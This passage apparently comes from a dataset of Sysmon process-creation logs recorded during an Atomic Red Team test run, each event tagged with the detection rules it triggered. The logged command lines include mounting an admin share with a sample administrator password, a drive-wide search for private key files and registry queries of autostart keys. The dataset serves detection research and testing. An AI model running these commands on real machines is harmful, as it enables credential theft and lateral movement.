ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 2624
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D845-5D31-0000-001098212F00
CommandLine: '""C:\Windows\system32\cmd.exe"" /c '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:48:37.099
"
2019-07-19T14:48:41.050661+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3672,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 2096
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D849-5D31-0000-0010914D2F00
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""cmd.exe /c "" net use \\Target\C$ P@ssw0rd1 /u:DOMAIN\Administrator'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:48:41.034
"
2019-07-19T14:48:41.085108+00:00,Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3673,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""cmd.exe /c "" net use \\Target\C$ P@ssw0rd1 /u:DOMAIN\Administrator'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 2096
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D849-5D31-0000-0010914D2F00
ProcessId: 3284
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D849-5D31-0000-0010E54F2F00
CommandLine: cmd.exe  /c  net use \\Target\C$ P@ssw0rd1 /u:DOMAIN\Administrator
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:48:41.068
"
2019-07-19T14:48:41.109076+00:00,Hacktool - EDR-Freeze Execution;System Network Connections Discovery Via Net.EXE;UAC Bypass Using NTFS Reparse Point - Process;Windows Share Mount Via Net.EXE,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3674,MSEDGEWIN10,"Image: C:\Windows\System32\net.exe
RuleName: ''
Description: Net Command
TerminalSessionId: 1
ParentCommandLine: cmd.exe  /c  net use \\Target\C$ P@ssw0rd1 /u:DOMAIN\Administrator
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3284
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=4F4970C3545972FEA2BC1984D597FC810E6321E0,MD5=AE61D8F04BCDE8158304067913160B31,SHA256=25C8266D2BC1D5626DCDF72419838B397D28D44D00AC09F02FF4E421B43EC369,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07
ParentProcessGuid: 747F3D96-D849-5D31-0000-0010E54F2F00
ProcessId: 6068
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D849-5D31-0000-00103C522F00
CommandLine: net  use \\Target\C$ P@ssw0rd1 /u:DOMAIN\Administrator
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:48:41.103
"
2019-07-19T14:48:46.238056+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3675,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 1628
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D84E-5D31-0000-00102C702F00
CommandLine: '""C:\Windows\system32\cmd.exe"" /c '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:48:46.221
"
2019-07-19T14:48:57.466584+00:00,Hacktool - EDR-Freeze Execution;Potentially Suspicious CMD Shell Output Redirect;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3676,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 6524
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D859-5D31-0000-0010E68C2F00
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""echo "" ""ATOMICREDTEAM > %%windir%%\cert.key""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:48:57.433
"
2019-07-19T14:48:57.524876+00:00,Hacktool - EDR-Freeze Execution;Private Keys Reconnaissance Via CommandLine Tools;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3677,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 888
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D859-5D31-0000-0010FB8F2F00
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""dir c:\ /b /s .key | findstr /e .key""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:48:57.502
"
2019-07-19T14:48:57.557947+00:00,Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;Private Keys Reconnaissance Via CommandLine Tools;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3678,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""dir c:\ /b /s .key | findstr /e .key""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 888
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D859-5D31-0000-0010FB8F2F00
ProcessId: 6220
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D859-5D31-0000-001045922F00
CommandLine: C:\Windows\system32\cmd.exe  /S /D /c"" dir c:\ /b /s .key ""
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:48:57.532
"
2019-07-19T14:48:57.570057+00:00,Hacktool - EDR-Freeze Execution;Private Keys Reconnaissance Via CommandLine Tools;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3679,MSEDGEWIN10,"Image: C:\Windows\System32\findstr.exe
RuleName: ''
Description: Find String (QGREP) Utility
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""dir c:\ /b /s .key | findstr /e .key""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 888
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=393F2422D22079BFB0022598D70BEB294F2024F4,MD5=DC0816790EFA08AA5B55C1EECFDDB525,SHA256=750AB5E1F3EB18CC42A4A4C7BAB27753F6B26FB9752AD3861833753091044281,IMPHASH=A27641A39DA5A6B0717E06BA00E56B7F
ParentProcessGuid: 747F3D96-D859-5D31-0000-0010FB8F2F00
ProcessId: 948
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D859-5D31-0000-00109E932F00
CommandLine: findstr  /e .key
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:48:57.547
"
2019-07-19T14:49:31.690830+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3680,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 3188
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D87B-5D31-0000-0010D92D3100
CommandLine: '""C:\Windows\system32\cmd.exe"" /c '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:49:31.675
"
2019-07-19T14:49:32.150327+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3681,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 2888
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D87C-5D31-0000-0010E83B3100
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""reg query "" HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:49:32.135
"
2019-07-19T14:49:32.180586+00:00,Hacktool - EDR-Freeze Execution;Potential Configuration And Service Reconnaissance Via Reg.EXE;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3682,MSEDGEWIN10,"Image: C:\Windows\System32\reg.exe
RuleName: ''
Description: Registry Console Tool
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""reg query "" HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 2888
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=429DF8371B437209D79DC97978C33157D1A71C4B,MD5=8A93ACAC33151793F8D52000071C0B06,SHA256=19316D4266D0B776D9B2A05D5903D8CBC8F0EA1520E9C2A7E6D5960B6FA4DCAF,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC
ParentProcessGuid: 747F3D96-D87C-5D31-0000-0010E83B3100
ProcessId: 5348
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D87C-5D31-0000-0010413E3100
CommandLine: reg  query  HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:49:32.176
"
2019-07-19T14:49:32.227372+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3683,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 5984
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D87C-5D31-0000-00107A403100
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:49:32.212
"
2019-07-19T14:49:32.249442+00:00,Hacktool - EDR-Freeze Execution;Potential Configuration And Service Reconnaissance Via Reg.EXE;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3684,MSEDGEWIN10,"Image: C:\Windows\System32\reg.exe
RuleName: ''
Description: Registry Console Tool
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 5984
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=429DF8371B437209D79DC97978C33157D1A71C4B,MD5=8A93ACAC33151793F8D52000071C0B06,SHA256=19316D4266D0B776D9B2A05D5903D8CBC8F0EA1520E9C2A7E6D5960B6FA4DCAF,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC
ParentProcessGuid: 747F3D96-D87C-5D31-0000-00107A403100
ProcessId: 5256
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D87C-5D31-0000-0010CC423100
CommandLine: reg  query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:49:32.238
"
2019-07-19T14:49:32.304938+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3685,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 5016
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D87C-5D31-0000-001009453100
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:49:32.284
"
2019-07-19T14:49:32.335446+00:00,Hacktool - EDR-Freeze Execution;Potential Configuration And Service Reconnaissance Via Reg.EXE;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3686,MSEDGEWIN10,"Image: C:\Windows\System32\reg.exe
RuleName: ''
Description: Registry Console Tool
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 5016
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=429DF8371B437209D79DC97978C33157D1A71C4B,MD5=8A93ACAC33151793F8D52000071C0B06,SHA256=19316D4266D0B776D9B2A05D5903D8CBC8F0EA1520E9C2A7E6D5960B6FA4DCAF,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC
ParentProcessGuid: 747F3D96-D87C-5D31-0000-001009453100
ProcessId: 6208
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D87C-5D31-0000-00105B473100
CommandLine: reg  query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:49:32.327
"
2019-07-19T14:49:32.389557+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3687,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 1680
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D87C-5D31-0000-001097493100
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:49:32.377
"
2019-07-19T14:49:32.413390+00:00,Hacktool - EDR-Freeze Execution;Potential Configuration And Service Reconnaissance Via Reg.EXE;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3688,MSEDGEWIN10,"Image: C:\Windows\System32\reg.exe
RuleName: ''
Description: Registry Console Tool
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1680
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=429DF8371B437209D79DC97978C33157D1A71C4B,MD5=8A93ACAC33151793F8D52000071C0B06,SHA256=19316D4266D0B776D9B2A05D5903D8CBC8F0EA1520E9C2A7E6D5960B6FA4DCAF,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC
ParentProcessGuid: 747F3D96-D87C-5D31-0000-001097493100
ProcessId: 3680
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D87C-5D31-0000-0010E94B3100
CommandLine: reg  query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:49:32.409
"
2019-07-19T14:49:32.463556+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3689,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 1428
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D87C-5D31-0000-0010264E3100
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:49:32.447
"
2019-07-19T14:49:32.497481+00:00,Hacktool - EDR-Freeze Execution;Potential Configuration And Service Reconnaissance Via Reg.EXE;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3690,MSEDGEWIN10,"Image: C:\Windows\System32\reg.exe
RuleName: ''
Description: Registry Console Tool
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1428
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=429DF8371B437209D79DC97978C33157D1A71C4B,MD5=8A93ACAC33151793F8D52000071C0B06,SHA256=19316D4266D0B776D9B2A05D5903D8CBC8F0EA1520E9C2A7E6D5960B6FA4DCAF,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC
ParentProcessGuid: 747F3D96-D87C-5D31-0000-0010264E3100
ProcessId: 3220
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D87C-5D31-0000-001078503100
CommandLine: reg  query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:49:32.493
"
